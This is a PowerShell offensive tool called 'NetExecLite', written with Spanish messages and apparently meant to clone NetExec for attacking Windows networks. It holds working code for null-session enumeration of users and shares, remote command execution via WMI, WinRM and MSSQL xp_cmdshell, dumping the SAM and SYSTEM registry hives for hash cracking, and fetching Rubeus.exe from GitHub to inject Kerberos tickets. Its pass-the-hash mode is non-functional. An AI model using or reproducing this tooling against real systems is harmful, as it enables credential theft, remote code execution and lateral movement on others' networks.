<#
.SYNOPSIS
    NetExecLite – NetExec en PowerShell puro (SAMR/LSARPC nativo, null sessions, etc.)
.EXAMPLE
    .\NetExecLite.ps1 -Target 192.168.1.10 -Module SMB
.EXAMPLE
    .\NetExecLite.ps1 -Target 192.168.1.10 -Module WinRM -Command "whoami" -Username ADMIN -Password P@ssw0rd
#>
[CmdletBinding(DefaultParameterSetName='Anon')]
param(
    [Parameter(Mandatory)][string]$Target,
    [Parameter(ParameterSetName='Creds')][string]$Username,
    [Parameter(ParameterSetName='Creds')][string]$Password,
    [Parameter(ParameterSetName='Hash')][string]$Hash,
    [string]$Command,
    [ValidateSet('SMB','WMI','WinRM','LDAP','SecretsDump','RDP','MSSQL','Kerberos')][string]$Module='SMB',
    [string]$TicketPath,
    [int]$SqlPort = 1433
)

# region SAMR/LSARPC P/Invoke
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class SamrNative {
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUserEnum(string servername, int level, int filter, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetLocalGroupEnum(string servername, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetShareEnum(string servername, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, ref int resume_handle);

    [DllImport("netapi32.dll")]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SHARE_INFO_1 {
        public string shi1_netname;
        public uint shi1_type;
        public string shi1_remark;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_0 {
        public string usri0_name;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LOCALGROUP_INFO_0 {
        public string lgrpi0_name;
    }
}
"@ -IgnoreWarnings
# endregion

function Get-Cred {
    param($User,$Pass,$Hash)
    if ($Hash) {
        Write-Host '[+] Pass-the-Hash mode' -ForegroundColor Cyan
        $sec = New-Object System.Security.SecureString
        return [pscredential]::new($User,$sec)
    }
    if ($User -and $Pass) {
        $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
        return [pscredential]::new($User,$sec)
    }
    return $null
}

function Get-SamrUsers {
    param($Server)
    $entries=$total=$handle=0; $ptr=[IntPtr]::Zero
    $res = [SamrNative]::NetUserEnum($Server,0,0,[ref]$ptr,-1,[ref]$entries,[ref]$total,[ref]$handle)
    if ($res -eq 0) {
        $offset=$ptr.ToInt64()
        0..($entries-1) | ForEach-Object {
            $usr = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+USER_INFO_0])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+USER_INFO_0])
            [pscustomobject]@{ Username = $usr.usri0_name }
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
    } else { Write-Warning "NetUserEnum error: $res" }
}

function Get-SamrGroups {
    param($Server)
    $entries=$total=$handle=0; $ptr=[IntPtr]::Zero
    $res = [SamrNative]::NetLocalGroupEnum($Server,0,[ref]$ptr,-1,[ref]$entries,[ref]$total,[ref]$handle)
    if ($res -eq 0) {
        $offset=$ptr.ToInt64()
        0..($entries-1) | ForEach-Object {
            $grp = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+LOCALGROUP_INFO_0])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+LOCALGROUP_INFO_0])
            [pscustomobject]@{ Group = $grp.lgrpi0_name }
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
    } else { Write-Warning "NetLocalGroupEnum error: $res" }
}

function Get-SamrShares {
    param($Server)
    $entries=$total=$handle=0; $ptr=[IntPtr]::Zero
    $res = [SamrNative]::NetShareEnum($Server,1,[ref]$ptr,-1,[ref]$entries,[ref]$total,[ref]$handle)
    if ($res -eq 0) {
        $offset=$ptr.ToInt64()
        0..($entries-1) | ForEach-Object {
            $shr = [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]::new($offset), [SamrNative+SHARE_INFO_1])
            $offset += [System.Runtime.InteropServices.Marshal]::SizeOf([SamrNative+SHARE_INFO_1])
            [pscustomobject]@{ Name = $shr.shi1_netname; Type = $shr.shi1_type; Remark = $shr.shi1_remark }
        }
        [SamrNative]::NetApiBufferFree($ptr) | Out-Null
    } else { Write-Warning "NetShareEnum error: $res" }
}

function Invoke-SMB {
    param($Target,$Cred)
    Write-Host "[=== SMB (SAMR/LSARPC nativo) ===]" -ForegroundColor Cyan
    if (-not $Cred) { Write-Host "[+] Intentando null session / guest" -ForegroundColor Yellow }
    Write-Host "`n[+] Shares:" -ForegroundColor Yellow
    Get-SamrShares -Server $Target | Format-Table -AutoSize
    Write-Host "`n[+] Users:" -ForegroundColor Yellow
    Get-SamrUsers -Server $Target | Format-Table -AutoSize
    Write-Host "`n[+] Groups:" -ForegroundColor Yellow
    Get-SamrGroups -Server $Target | Format-Table -AutoSize
}

function Invoke-WMI {
    param($Target,$Cred,$Cmd)
    $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Cmd -ComputerName $Target -Credential $Cred
    if ($r.ReturnValue -eq 0) { Write-Host "[+] WMI OK – PID: $($r.ProcessId)" -ForegroundColor Green }
    else { Write-Warning "WMI error $($r.ReturnValue)" }
}

function Invoke-WinRM {
    param($Target,$Cred,$Cmd)
    $s = New-PSSession -ComputerName $Target -Credential $Cred -ErrorAction Stop
    $out = Invoke-Command -Session $s -ScriptBlock { param($c) iex $c } -ArgumentList $Cmd
    $out; Remove-PSSession $s
}

function Invoke-LDAP {
    param($Target,$Cred)
    $dom = (Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Target -Credential $Cred).Domain
    $s = [adsisearcher]'(&(objectClass=user))'
    $s.SearchRoot = [adsi]"LDAP://$dom"
    $s.PageSize = 1000
    $s.FindAll() | ForEach-Object {
        [pscustomobject]@{
            Username    = $_.Properties.samaccountname[0]
            Description = $_.Properties.description[0]
        }
    } | Format-Table -AutoSize
}

function Invoke-SecretsDump {
    param($Target,$Cred)
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\sam C:\Windows\Temp\sam.save" -ComputerName $Target -Credential $Cred | Out-Null
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c reg save hklm\system C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
    Copy-Item "\\$Target\C$\Windows\Temp\sam.save" -Force
    Copy-Item "\\$Target\C$\Windows\Temp\system.save" -Force
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save" -ComputerName $Target -Credential $Cred | Out-Null
    Write-Host '[+] sam.save & system.save descargados. Usa secretsdump.py para extraer hashes.' -ForegroundColor Magenta
}

function Invoke-RDP {
    param($Target,$Cred)
    $t = Test-NetConnection -ComputerName $Target -Port 3389 -WarningAction SilentlyContinue
    if (-not $t.TcpTestSucceeded) { Write-Warning 'RDP (3389) no accesible'; return }
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $pc = [System.DirectoryServices.AccountManagement.PrincipalContext]::new('Domain',$Target)
    $ok = $pc.ValidateCredentials($Cred.UserName,$Cred.GetNetworkCredential().Password)
    Write-Host "[+] RDP accessible y creds válidas: $ok" -ForegroundColor $(if($ok){'Green'}else{'Red'})
}

function Invoke-MSSQL {
    param($Target,$Cred,$Cmd,$Port)
    $conn = [System.Data.SqlClient.SqlConnection]::new()
    $conn.ConnectionString = "Server=$Target,$Port;Database=master;User ID=$($Cred.UserName);Password=$($Cred.GetNetworkCredential().Password);"
    try {
        $conn.Open()
        $en = 'sp_configure ''show advanced options'',1;RECONFIGURE;sp_configure ''xp_cmdshell'',1;RECONFIGURE;'
        $null = [System.Data.SqlClient.SqlCommand]::new($en,$conn).ExecuteNonQuery()
        $sql = "xp_cmdshell '$Cmd'"
        $reader = [System.Data.SqlClient.SqlCommand]::new($sql,$conn).ExecuteReader()
        while ($reader.Read()) { if ($reader[0]) { $reader[0] } }
        $reader.Close()
    } catch { Write-Error "MSSQL: $_" } finally { $conn.Close() }
}

function Invoke-Kerberos {
    param($TicketPath)
    $rubeus = "$env:TEMP\Rubeus.exe"
    if (-not (Test-Path $rubeus)) {
        Write-Host '[+] Descargando Rubeus...' -ForegroundColor Yellow
        Invoke-WebRequest https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -OutFile $rubeus
    }
    & $rubeus ptt /ticket:$(Resolve-Path $TicketPath).Path | Out-String -Stream | Write-Host
}

# --------- main ---------
$cred = Get-Cred -User $Username -Pass $Password -Hash $Hash

switch ($Module) {
    'SMB'  { Invoke-SMB -Target $Target -Cred $cred }
    'WMI'  { if (-not $Command) { Write-Error '-Command requerido'; break }; Invoke-WMI -Target $Target -Cred $cred -Cmd $Command }
    'WinRM'{ if (-not $Command) { Write-Error '-Command requerido'; break }; Invoke-WinRM -Target $Target -Cred $cred -Cmd $Command }
    'LDAP' { Invoke-LDAP -Target $Target -Cred $cred }
    'SecretsDump' { Invoke-SecretsDump -Target $Target -Cred $cred }
    'RDP'  { Invoke-RDP -Target $Target -Cred $cred }
    'MSSQL'{ if (-not $Command) { Write-Error '-Command requerido'; break }; Invoke-MSSQL -Target $Target -Cred $cred -Cmd $Command -Port $SqlPort }
    'Kerberos'{ if (-not $TicketPath) { Write-Error '-TicketPath requerido'; break }; Invoke-Kerberos -TicketPath $TicketPath }
    default { Write-Warning "Módulo no implementado" } }